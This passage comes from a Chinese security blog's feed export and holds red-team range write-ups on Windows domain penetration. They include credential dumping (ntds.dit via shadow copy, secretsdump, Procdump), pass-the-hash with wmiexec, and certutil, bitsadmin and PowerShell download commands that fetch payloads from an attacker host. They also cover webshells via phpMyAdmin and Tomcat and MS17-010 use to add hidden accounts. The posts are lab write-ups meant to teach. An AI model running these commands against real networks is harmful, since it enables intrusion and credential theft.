class="symbol">\n</span>tds.dit </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\s</span>ystem.hive</span><br><span class="line">vssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet</span><br><span class="line">最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复</span><br><span class="line">python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL</span><br><span class="line"></span><br><span class="line">域管理员的password为hash格式。</span><br><span class="line"></span><br><span class="line">后使用 CrackMapExec、wmiexec等工具进行进一步测试。</span><br></pre></td></tr></table></figure><p><strong>注：</strong>调用<code>Volume Shadow Copy</code>服务会产生日志文件，位于System下，<code>Event ID为7036</code></p></li></ul><h2 id="2）遇到问题"><a href="#2）遇到问题" class="headerlink" title="2）遇到问题"></a>2）遇到问题</h2><p>执行以下命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec<span class="selector-class">.py</span> -hashes LMHASH:NTHASH rcoil/administrator@<span class="number">172.16</span>.<span class="number">238.29</span> <span class="string">"c:\\payload.exe"</span></span><br></pre></td></tr></table></figure></p><p><code>Cobalt Strike</code>未上线，这个情况其实是第一次见。</p><p>以多种形式的<code>payload</code>运行也无果。</p><p>确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。</p><h2 id="3）方案"><a href="#3）方案" class="headerlink" title="3）方案"></a>3）方案</h2><ul><li>获取明文密码，计划任务启动；</li><li>添加<code>HKLM自启注册表</code></li></ul><h1 id="0x05-获取域管明文密码"><a href="#0x05-获取域管明文密码" class="headerlink" title="0x05 获取域管明文密码"></a>0x05 获取域管明文密码</h1><p>使用<code>powerview</code>查询域管登陆过的机器：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Find-DomainUserLocation == old Invoke-UserHunter</span></span><br><span class="line"><span class="meta"># enumerate servers that allow unconstrained Kerberos delegation and show all users logged in</span></span><br><span class="line">Find-DomainUserLocation -ComputerUnconstrained -ShowAll</span><br></pre></td></tr></table></figure></p><p>最后选择了<code>172.16.10.29</code>的<code>win 2008 server</code>的机器，而且这台机器上存在<code>AdAudit Plus</code>。</p><p><img src="/image/【测试评估】内网练习（四）/blog_2019-03-25_16-37-30.png" alt="blog_2019-03-25_16-37-30"></p><p>由于目前没有任何容器可提供文件传输，所以自建。</p><ul><li><p>在<code>DKRST011</code>机器创建<code>FTP</code>或者<code>Web</code>服务；</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="type">PORT</span> = <span class="number">80</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"use: web.exe port"</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="type">PORT</span> = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="type">Handler</span> = <span class="type">SimpleHTTPServer</span>.<span class="type">SimpleHTTPRequestHandler</span></span><br><span class="line">httpd = <span class="type">SocketServer</span>.<span class="type">TCPServer</span>((<span class="string">""</span>, <span class="type">PORT</span>), <span class="type">Handler</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"SimpleHTTPServer is "</span>, <span class="type">PORT</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"by k8gege"</span></span><br><span class="line">httpd.serve_forever()</span><br><span class="line">来源：https:<span class="comment">//raw.githubusercontent.com/k8gege/K8tools/master/web.py </span></span><br><span class="line">注：这类型操作也需要添加防火墙规则，防止弹窗</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"web.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"c:\Users\Public\Downloads\web.exe"</span> action=allow</span><br></pre></td></tr></table></figure></li><li><p>使用<code>certutil</code>、<code>bitsadmin</code>、<code>powersehll</code>等自带程序下载；</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> certutil -urlcache -split -f  http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> bitsadmin /rawreturn /transfer 任务名 http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> powershell -WindowStyle Hidden <span class="string">"IEX (New-Object Net.WebClient).DownloadFile('http://172.16.238.29/1.rar','c:\windows\temp\ 2.rar')"</span></span><br></pre></td></tr></table></figure><p>这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。</p></li></ul><p>往下就是<code>Procdump</code>的一些操作，成功获取到明文密码。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 高权限计划任务启动CS服务端，未上线。</span><br><span class="line"><span class="string">[*]</span> 添加HKLM自启动，未上线。</span><br><span class="line"></span><br><span class="line">这是什么问题呢？（未解决）</span><br></pre></td></tr></table></figure><h1 id="0x05-其余flag获取"><a href="#0x05-其余flag获取" class="headerlink" title="0x05 其余flag获取"></a>0x05 其余flag获取</h1><p>从提示与目的来判断，剩下的<code>2个flag</code>位于<code>demo.rcoil.local域</code>的域控、域用户名为<code>flagav</code>的机器上。</p><ul><li><p><code>flagav</code>用户机器<br>直接从<code>AdAudit Plus</code>获取到域用户<code>flagav</code>的登陆情况，这样就不用去翻日志了。<br>使用<code>CrackMapExec</code>、<code>wmiexec</code>等工具执行命令查找flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Cease_to_struggle_and_you_cease_to_live&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li><li><p>子域域控flag</p></li></ul><p>使用主域控的域管可直接登陆子域的域控</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Success<span class="number">_</span>grows<span class="number">_</span><span class="keyword">out</span><span class="number">_</span><span class="keyword">of</span><span class="number">_</span>struggles<span class="number">_</span>to<span class="number">_</span>overcome<span class="number">_</span>difficulties&#125;</span><br></pre></td></tr></table></figure><h1 id="0x0x-最后的拓扑"><a href="#0x0x-最后的拓扑" class="headerlink" title="0x0x 最后的拓扑"></a>0x0x 最后的拓扑</h1><p>好多没去了解，就草草结束了。</p><p><img src="/image/【测试评估】内网练习（四）/网络拓扑.png" alt="网络拓扑"></p><p><strong>免责声明：</strong>文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。&lt;/p&gt;
&lt;p&gt;分享便是我最好的老师。   ——Micropoor&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试评估" scheme="https://rcoil.me/tags/%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>【测试评估】内网练习（三）</title>
    <link href="https://rcoil.me/2019/01/%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://rcoil.me/2019/01/【测试评估】内网练习（三）/</id>
    <published>2019-01-01T03:13:38.000Z</published>
    <updated>2019-11-01T01:46:55.864Z</updated>
    
    <content type="html"><![CDATA[<p>文章已脱敏，为了方便理解，IP未处理。</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：查找内网中找到<code>R9部门</code>中关键字为<code>flag_yinquesiting_rcoil</code>的文件（文档、数据库不限）。 </li><li>提示：域用户备注存在部门名称。</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/【测试评估】内网练习（三）/初始网络拓扑.png" alt="Snipaste_2018-09-20_11-26-53"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>入口点是工作组内普通的一台<code>win7系统权限</code>（可出外网 –&gt; <code>AttackVPS</code>），上线<code>Cobalt Strike</code>（使用https协议）进行操作。</p><ul><li><code>M238-RcoIl</code>的基本信息。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: M238-RcoIl</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: WORKGROUP</span><br><span class="line">IP地址: <span class="number">10.20</span><span class="number">.238</span><span class="number">.29</span> （此C段纯工作组）</span><br><span class="line">杀软: Panda Endpoint Protection、McAfee、SMADAV (非最新版)</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>注：操作存在未成功状态。在操作时发现此靶机的流量明显受阻，初步研判是存在类似流量审计的系统。</p><p>在TCP连接及浏览器浏览记录中发现了一些内网IP，做记录。其余未发现有任何敏感信息，故此机器仅作跳板机即可。</p><p>由此机器（<code>M238-RcoIl</code>）作为<code>A跳板</code>，通过<code>Socks4代理</code>对所处网络C段进行常规的端口探测（Web、SMB、SSH、FTP、SMTP等），最后通过<code>MS-17-010</code>获取到<code>10.20.238.12</code>机器权限，上线<code>Cobalt Strike</code>进行操作。</p><ul><li>重复信息收集步骤</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">机器名: Admin-RcoIl</span></span><br><span class="line"><span class="section">权限: system权限</span></span><br><span class="line"><span class="section">系统: Windows Vista Business 6.0.6000 N/A Build 6000 x86</span></span><br><span class="line"><span class="section">Domain: WORKGROUP</span></span><br><span class="line"><span class="section">IP地址: 10.20.238.12 （此C段纯工作组）</span></span><br><span class="line"><span class="section">杀软: Panda Endpoint Protection、SMADAV (非最新版)</span></span><br><span class="line"><span class="section">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span></span><br><span class="line"><span class="section">额为信息: 10.1.1.0/24</span></span><br></pre></td></tr></table></figure><p>注：操作存在未成功状态。</p><p>从信息收集情况来看，此机器仅多了几个内网连接，但这一台机器的网络环境比A跳板机好很多。故，由此机器作为<code>B跳板机</code>，同样是使用<code>Socks4</code>。</p><ul><li>此时网路拓扑为：</li></ul><p><img src="J:\blog_2019-01-14_18-33-14.png" alt="blog_2019-01-14_18-33-14"></p><p><img src="/image/【测试评估】内网练习（三）/blog_2019-01-14_18-33-14.png" alt="blog_2018-10-18_18-24-12"></p><h1 id="0x02-内网拓展-一"><a href="#0x02-内网拓展-一" class="headerlink" title="0x02 内网拓展 一"></a>0x02 内网拓展 一</h1><p>由于搭建的B跳板机网络较好，所以使用B跳板机。</p><p>对<code>10.1.1.0/24</code>进行常规的端口探测</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SMB:</span> 探测无结果</span><br><span class="line"><span class="string">Web:</span> 利用点最好选为初始环境（默认配置）</span><br><span class="line">--&gt;<span class="string">http:</span><span class="comment">//10.1.1.133/rcoil/main/index.php RcoIl的窝-许可证注册管理系统</span></span><br><span class="line">--&gt;<span class="string">http:</span><span class="comment">//10.1.1.91 Tomcat管理页面</span></span><br><span class="line">其余情况: 无</span><br></pre></td></tr></table></figure><h2 id="一、web默认配置"><a href="#一、web默认配置" class="headerlink" title="一、web默认配置"></a>一、web默认配置</h2><p><code>10.1.1.133</code>这个web是默认配置（非CMS），并且存在<code>phpmyadmin</code>，尝试弱口令 –&gt; 进入后台 –&gt; 写入shell –&gt; 蚁剑连接 –&gt; 成功、系统权限（这就是默认配置的魅力 –&gt; 简洁快速）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: WIN-B001</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 Standard 6.0.06002<span class="built_in"> Service </span>Pack 2 x64</span><br><span class="line">Domain: WORKGROUP</span><br><span class="line">IP地址: 10.1.1.133 （此C段存在域）</span><br><span class="line">杀软: 无</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: TCP未存在已连接IP</span><br></pre></td></tr></table></figure><p>查看TCP连接，未发现任何的连接情况。上线<code>Cobalt Strike</code>未成功，此时查看连接，发现靶机与<code>AttackVPS</code>处于<code>SYN-SENT</code>状态，没有访问成功？经过探测，确定是出不来的状态，最后使用<code>smb</code>协议上线。</p><p>从它数据库中获取了一些密码，但感觉会没有作用，因为都是一些弱智密码。</p><h2 id="二、Tomcat默认配置"><a href="#二、Tomcat默认配置" class="headerlink" title="二、Tomcat默认配置"></a>二、Tomcat默认配置</h2><p>Tomcat是默认密码，部署war拿到系统权限，但是由于是jsp，蚁剑不支持，所以使用菜刀连接。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: PG-BUK</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard 6.1.7601<span class="built_in"> Service </span>Pack 1 Build 7601 x64</span><br><span class="line">Domain: demo.rcoil.me</span><br><span class="line">IP地址: 10.1.1.91 （此C段存在域）</span><br><span class="line">杀软: Panda Security (非最新版)</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 此机器8080端口为Apache服务</span><br></pre></td></tr></table></figure><p>在此机器上获取到了域管理员帐密（<code>DEMO\Administrator/test@demo02</code>），但是在此机器上获取不到别的域信息，报出<code>1355错误</code>。<code>powerview</code>运行报错。</p><p><code>8080</code>端口是一个端点资产管理系统，使用的是<code>xampp</code>。</p><p>查看量数，不得了，15K的量，这数据也是伪造得够狠的，分不清哪些是真是假，能不能通往。</p><p>查看数据库，是站库分离的，数据库在<code>10.1.1.16</code>，使用的是<code>mssql</code>，开启<code>xp_cmdshell</code>。</p><h2 id="三、数据库"><a href="#三、数据库" class="headerlink" title="三、数据库"></a>三、数据库</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: DCO-DB</span><br><span class="line">权限: 网络权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard 6.1.7601<span class="built_in"> Service </span>Pack 1 x64</span><br><span class="line">Domain: demo.rcoil.me</span><br><span class="line">IP地址: 10.1.1.16 （此C段存在域）</span><br><span class="line">杀软: Panda Security、Symantec (非最新版)</span><br><span class="line">已有操作: TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 使用获取的域管账号登陆失败、查询域内信息1355报错</span><br></pre></td></tr></table></figure><h2 id="四、SPN"><a href="#四、SPN" class="headerlink" title="四、SPN"></a>四、SPN</h2><p><code>SPN：</code>“服务主体名称(SPN)是由客户端对一个服务实例进行唯一标识的名称”。这意味着安装到Windows域中的每个服务都会被注册到活动目 录(Active Directory)中。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> -Q *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>使用这个对于信息收集也很快速。但是这里出现错误</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ldap <span class="builtin-name">Error</span>(0x51 --<span class="built_in"> Server </span>Down): ldap_connect</span><br><span class="line">Failed <span class="keyword">to</span> retrieve DN <span class="keyword">for</span> domain <span class="string">"demo.rcoil.me"</span> : 0x00000051</span><br><span class="line">Warning: <span class="literal">No</span> valid targets specified, reverting <span class="keyword">to</span> current domain.</span><br><span class="line">Ldap <span class="builtin-name">Error</span>(0x51 --<span class="built_in"> Server </span>Down): ldap_connect</span><br><span class="line"><span class="builtin-name">Error</span> occured when searching <span class="keyword">for</span> existing SPN: 0x00000051</span><br></pre></td></tr></table></figure><h1 id="0x03-内网拓展-二"><a href="#0x03-内网拓展-二" class="headerlink" title="0x03 内网拓展 二"></a>0x03 内网拓展 二</h1><h2 id="一、SMB协议"><a href="#一、SMB协议" class="headerlink" title="一、SMB协议"></a>一、SMB协议</h2><p><code>WIN-B001</code>机器作为<code>C跳板机</code>。</p><p>进行C段SMB识别，发现是可以探测出来版本等信息。因此可知，B跳板机的网段是被做了些隔离限制。</p><p>先大概摸清网络拓扑，接下来进行以下操作：</p><ul><li>从资产管理系统抽取IP段；</li></ul><ul><li>对抽取的IP段进行SMB信息探测，但可能会有隔离等策略限制；</li><li>使用<code>MS-17-010</code>配合进行漏洞检测；</li><li><code>MS-17-010</code>的漏洞作用为添加隐藏账号</li></ul><p>最后共计有226台机器检测出存在漏洞。从筛选SMB信息探测结果来看，此机器可到达内网域有6个。看了看数据，总感觉漏了东西，如果这些信息没有帮助的话，就对<code>10.0.0.0/8</code>进行全面识别了。</p><h2 id="二、SMB协议利用"><a href="#二、SMB协议利用" class="headerlink" title="二、SMB协议利用"></a>二、SMB协议利用</h2><p>使用<code>Cobalt Strike</code>批量测试上线外网情况，有一台（<code>NSVC-001_10.160.5.51</code>）机器成功上线。并且这台机器没有任何的杀软限制（后续因忽略了流量审计系统的问题，掉线），接下来的操作都是基于这台机器做的<code>D跳板</code>。</p><p>使用<code>NSVC-001_10.160.5.51</code>作为<code>根beacon</code>，<code>smb协议</code>上线<code>PG-BUK_10.1.1.91</code>。</p><p>从探测结果选择一个域名为<code>ba.demo.me</code>且存在<code>MS-17-010漏洞的机器</code>，从<code>PG-BUK_10.1.1.91</code>使用<code>smb协议</code>上线<code>BA-AS02_10.0.1.34</code></p><h2 id="三、ba-demo-me域"><a href="#三、ba-demo-me域" class="headerlink" title="三、ba.demo.me域"></a>三、ba.demo.me域</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: BA-AS02</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard  x64 备份域控</span><br><span class="line">Domain: ba.demo.me</span><br><span class="line">IP地址: 10.0.1.34</span><br><span class="line">杀软: 无</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 获取到域管理员账号密码、域信任关系</span><br></pre></td></tr></table></figure><p>从这一台机器上面的信息可疑判断，这个靶场环境是存在<code>PacketShaper</code>，非常的贴切。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看域控制器</span><br><span class="line"><span class="keyword">c</span>:\Users\Public\Downloads&gt; nltest /dclis<span class="variable">t:ba</span>.demo.<span class="keyword">me</span></span><br><span class="line">Get <span class="keyword">list</span> of DCs in domain <span class="string">'ba.demo.me'</span> from <span class="string">'\\BA-AS02.ba.demo.me'</span>.</span><br><span class="line">    BA-AS02.<span class="keyword">ba</span>.demo.<span class="keyword">me</span>        [DS] Site: Default-First-Site-Name</span><br><span class="line">    BA-AM02.<span class="keyword">ba</span>.demo.<span class="keyword">me</span>        [DS] Site: Default-First-Site-Name</span><br><span class="line">    BA-AS01.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> [PDC]  [DS] Site: Default-First-Site-Name</span><br><span class="line">The <span class="keyword">command</span> completed successfully</span><br><span class="line"></span><br><span class="line"># 查看域信任关系</span><br><span class="line"><span class="keyword">c</span>:\Users\Public\Downloads&gt; nltest /domain_trusts</span><br><span class="line">List of domain trust<span class="variable">s:</span></span><br><span class="line">    <span class="number">0</span>: PH ph.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">1</span>: SH <span class="keyword">sh</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">2</span>: KL kl.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">3</span>: KD kd.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">4</span>: SW <span class="keyword">sw</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">5</span>: PS <span class="keyword">ps</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )</span><br><span class="line">    <span class="number">6</span>: BA <span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">The <span class="keyword">command</span> completed successfully</span><br><span class="line">不得了，居然有子域，而且目前位置是在根域。</span><br></pre></td></tr></table></figure><p>其实这一台机器上面的web服务也是默认的<code>xampp</code>，但是<code>phpmyadmin</code>只允许本地访问，而且首页做了跳转。</p><p>在对<code>BA-AS02_10.0.1.34</code>进行信息收集时，<code>D跳板机</code>断开连接，经初步研判，应该是管理员对机器进行了维护。所以使用<code>B跳板机</code>继续操作。</p><p>此域存在200+用户，并未发现关键词。利用<code>SPN</code>识别域内的<code>SQL服务</code>，并未发现，故放弃此域。</p><p>接下来往其他域着手。</p><h1 id="0x0x-最后的思维导图"><a href="#0x0x-最后的思维导图" class="headerlink" title="0x0x 最后的思维导图"></a>0x0x 最后的思维导图</h1><p><img src="/image/【测试评估】内网练习（三）/Snipaste_2018-09-20_11-26-53.PNG" alt="Snipaste_2018-09-20_11-26-53"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章已脱敏，为了方便理解，IP未处理。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试评估" scheme="https://rcoil.me/tags/%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域环境内用户登录信息</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>https://rcoil.me/2018/11/【域渗透】获取域环境内用户登录信息/</id>
    <published>2018-11-26T08:06:48.000Z</published>
    <updated>2019-10-31T15:44:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前见到有人在讨论<a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢</a>，集思广益，结合答复及自己的观点，总结了以下内容。<br><a id="more"></a></p><h2 id="0x00-adfind"><a href="#0x00-adfind" class="headerlink" title="0x00 adfind"></a>0x00 adfind</h2><p>有时候管理员会设置域用户只可以登录指定的的域内计算机，使用 adfind或者 powerview导出域用户信息可以查看；<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看域内用户详细信息：</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>rcoil(目标用户)</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>rcoil | findstr userWorkstations <span class="comment">//非域权限执行需要指定账户密码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>*</span><br><span class="line">详见：<span class="string">http:</span><span class="comment">//www.joeware.net/freetools/tools/adfind/usage.htm</span></span><br></pre></td></tr></table></figure></p><p>powerview在域内执行就可以。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Domain demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span>  <span class="comment">//domain参数请加完整的域名</span></span><br><span class="line">或</span><br><span class="line">Invoke-EnumerateLocalAdmin</span><br></pre></td></tr></table></figure><h2 id="0x01-查看域内机器的用户目录文件夹"><a href="#0x01-查看域内机器的用户目录文件夹" class="headerlink" title="0x01 查看域内机器的用户目录文件夹"></a>0x01 查看域内机器的用户目录文件夹</h2><p>确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ password /u:domain\domain_admins_user</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (</span><br><span class="line">                <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span 